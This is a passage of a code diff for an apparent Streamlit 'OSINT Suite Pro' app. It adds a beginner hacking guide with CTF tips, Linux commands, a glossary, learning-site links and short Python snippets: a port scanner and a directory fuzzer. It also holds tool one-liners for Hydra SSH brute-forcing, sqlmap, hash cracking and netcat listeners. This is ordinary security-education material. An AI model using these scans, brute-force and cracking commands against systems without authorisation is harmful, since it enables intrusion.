+            ("Step 6: Hint system","Many platforms (picoCTF, HTB) offer hints — use them, no shame."),
+            ("Step 7: Writeups","If stuck after 30 min, read writeups for similar old challenges — CTFtime.org has thousands."),
+        ]
+        for title, body in steps:
+            st.markdown(f"<div class='result-card'><b>{title}</b><br><span style='color:rgba(160,200,240,0.6);'>{body}</span></div>", unsafe_allow_html=True)
+
+    elif guide == "🔐 Linux Basics":
+        cmds = [
+            ("Navigation","cd /path   ls -la   pwd   find / -name file 2>/dev/null"),
+            ("File ops","cat file   less file   head/tail -n 20   cp src dst   mv src dst   rm file"),
+            ("Permissions","chmod 755 file   chown user:group file   ls -la (rwxrwxrwx)"),
+            ("Processes","ps aux   kill PID   top/htop   jobs   bg/fg"),
+            ("Network","ifconfig / ip a   netstat -tulnp   ss -tulnp   curl   wget   ping   traceroute"),
+            ("Search","grep -r 'pattern' /dir   grep -i (case insensitive)   grep -v (invert)"),
+            ("Pipes & redirect","cmd | cmd2   cmd > file   cmd >> file   cmd 2>&1   cmd < input"),
+            ("Useful shortcuts","Ctrl+C (kill)   Ctrl+Z (suspend)   Ctrl+D (EOF)   Tab (autocomplete)   !! (last cmd)"),
+        ]
+        for title, cmd in cmds:
+            st.markdown(f"<div class='result-card'><b>{title}</b><br><code style='font-size:0.8rem;'>{cmd}</code></div>", unsafe_allow_html=True)
+
+    elif guide == "🐍 Python for Hacking":
+        snippets = [
+            ("Port scanner", "import socket\nfor p in range(1,1025):\n    s=socket.socket()\n    s.settimeout(0.5)\n    if s.connect_ex(('target',p))==0: print(f'Open: {p}')\n    s.close()"),
+            ("XOR decrypt", "ct=bytes.fromhex('1a2b3c')\nkey=0x41\nprint(bytes([b^key for b in ct]))"),
+            ("HTTP request", "import requests\nr=requests.get('https://target.com',headers={'User-Agent':'Mozilla/5.0'})\nprint(r.status_code, r.text[:200])"),
+            ("Parse HTML", "from bs4 import BeautifulSoup\nsoup=BeautifulSoup(r.text,'html.parser')\nlinks=[a['href'] for a in soup.find_all('a',href=True)]"),
+            ("Base64 loop decode", "import base64\ns='dGVzdA=='\nwhile True:\n    try: s=base64.b64decode(s).decode()\n    except: break\nprint(s)"),
+            ("Simple fuzzer", "import requests\nwith open('wordlist.txt') as f:\n    for word in f:\n        r=requests.get(f'https://target.com/{word.strip()}')\n        if r.status_code==200: print(word.strip())"),
+        ]
+        for title, code in snippets:
+            with st.expander(f"📄 {title}"):
+                st.code(code, language="python")
+
+    elif guide == "📚 Free Learning Resources":
+        resources = [
+            ("TryHackMe","https://tryhackme.com","Best structured beginner platform. Free tier is huge."),
+            ("HackTheBox","https://hackthebox.com","Intermediate+. Realistic machines. Free starting point."),
+            ("picoCTF","https://picoctf.org","Beginner CTF by Carnegie Mellon. Always open."),
+            ("PortSwigger Web Academy","https://portswigger.net/web-security","Best free web hacking course, period."),
+            ("CryptoHack","https://cryptohack.org","Interactive cryptography CTF-style learning."),
+            ("OverTheWire","https://overthewire.org/wargames/","Linux + security wargames. Start with Bandit."),
+            ("CTFtime","https://ctftime.org","CTF calendar + writeups archive."),
+            ("HackTricks","https://book.hacktricks.xyz","Massive pentest reference book (free)."),
+            ("GTFOBins","https://gtfobins.github.io","Linux privesc via sudo/SUID binaries."),
+            ("LOLBAS","https://lolbas-project.github.io","Windows living-off-the-land binaries."),
+            ("PentesterLab","https://pentesterlab.com","Web security labs with certificates."),
+            ("TCM Security","https://tcm-sec.com","Affordable OSCP-prep video courses."),
+        ]
+        for name, url, desc in resources:
+            st.markdown(f"<div class='result-card'><b><a href='{url}' target='_blank'>{name}</a></b><br><span style='color:rgba(160,200,240,0.6);font-size:0.82rem;'>{desc}</span></div>", unsafe_allow_html=True)
+
+    elif guide == "🧰 Essential Toolbox":
+        tools = [
+            ("Nmap","Network scanner","nmap -sV -sC target"),
+            ("Burp Suite","Web proxy/interceptor","Community edition free — portswigger.net"),
+            ("Metasploit","Exploitation framework","msfconsole"),
+            ("Wireshark","Packet capture/analysis","GUI — wireshark.org"),
+            ("Gobuster","Dir/subdomain brute-force","gobuster dir -u URL -w wordlist"),
+            ("SQLmap","SQL injection automation","sqlmap -u URL --dbs"),
+            ("John the Ripper","Password cracker","john --wordlist=rockyou.txt hash.txt"),
+            ("Hashcat","GPU hash cracker","hashcat -m 0 hash.txt rockyou.txt"),
+            ("Hydra","Login brute-forcer","hydra -l admin -P pass.txt ssh://target"),
+            ("Netcat","TCP Swiss army knife","nc -lvnp 4444  /  nc target 4444"),
+            ("Binwalk","Firmware/file extractor","binwalk -e file.bin"),
+            ("Volatility 3","Memory forensics","python3 vol.py -f mem.dmp windows.pslist"),
+        ]
+        for name, desc, cmd in tools:
+            st.markdown(f"<div class='result-card'><b>{name}</b> — {desc}<br><code style='font-size:0.78rem;'>{cmd}</code></div>", unsafe_allow_html=True)
+
+    elif guide == "🔤 Terminology Glossary":
+        terms = {
+            "OSINT": "Open Source Intelligence — gathering info from public sources.",
+            "CVE": "Common Vulnerabilities and Exposures — standardized vulnerability ID (e.g. CVE-2021-44228).",
+            "RCE": "Remote Code Execution — running arbitrary commands on a target system.",
+            "LFI/RFI": "Local/Remote File Inclusion — including server files via unvalidated input.",
+            "SSRF": "Server-Side Request Forgery — making the server fetch internal resources.",
+            "XSS": "Cross-Site Scripting — injecting scripts into pages viewed by other users.",
+            "SQLi": "SQL Injection — manipulating database queries via unsanitized input.",
+            "PrivEsc": "Privilege Escalation — gaining higher permissions (e.g., root/SYSTEM).",
+            "Lateral Movement": "Moving from one compromised host to others in the network.",
+            "C2 / C&C": "Command & Control — infrastructure used to control compromised machines.",
+            "Payload": "Code delivered/executed on a target (reverse shell, meterpreter, etc.).",
+            "OPSEC": "Operational Security — keeping your activities anonymous/undetectable.",
+            "Red Team": "Simulates real-world attackers in a controlled engagement.",
+            "Blue Team": "Defenders — SOC analysts, incident response, threat hunting.",
+            "Purple Team": "Red + Blue collaboration to improve detection and response.",
+            "CTF": "Capture The Flag — competitive security challenge competitions.",
+            "WAF": "Web Application Firewall — filters malicious HTTP traffic.",
+            "SIEM": "Security Info & Event Management — log aggregation and alerting platform.",
+            "IOC": "Indicator of Compromise — artifacts suggesting a breach (IP, hash, domain).",
+            "Zero-day": "Vulnerability unknown to the vendor with no available patch.",
+        }
+        for term, definition in terms.items():
+            st.markdown(f"<div class='result-card'><b><code>{term}</code></b><br>{definition}</div>", unsafe_allow_html=True)
+
+
 st.markdown("""
 <div style='text-align:center;padding:2rem 0 1rem;'>
-  <div style='
-    display:inline-block;
-    background:linear-gradient(135deg,rgba(255,255,255,0.05),rgba(255,255,255,0.02));
-    backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,0.08);
-    border-radius:50px;
-    padding:8px 24px;
-    font-family:"Share Tech Mono",monospace;
-    font-size:0.65rem;
-    color:rgba(120,160,200,0.6);
-    letter-spacing:0.12em;
-  '>
-    🕵️ OSINT SUITE PRO &nbsp;·&nbsp; REAL DATA ONLY &nbsp;·&nbsp; NO SIMULATION &nbsp;·&nbsp; v2.0 · 2026
+  <div style='display:inline-block;background:linear-gradient(135deg,rgba(255,255,255,0.05),rgba(255,255,255,0.02));backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.08);border-radius:50px;padding:8px 24px;font-family:"Share Tech Mono",monospace;font-size:0.65rem;color:rgba(120,160,200,0.6);letter-spacing:0.12em;'>
+    🕵️ OSINT SUITE PRO &nbsp;·&nbsp; REAL DATA ONLY &nbsp;·&nbsp; v2.0 · 2026
   </div>
 </div>
 """, unsafe_allow_html=True)
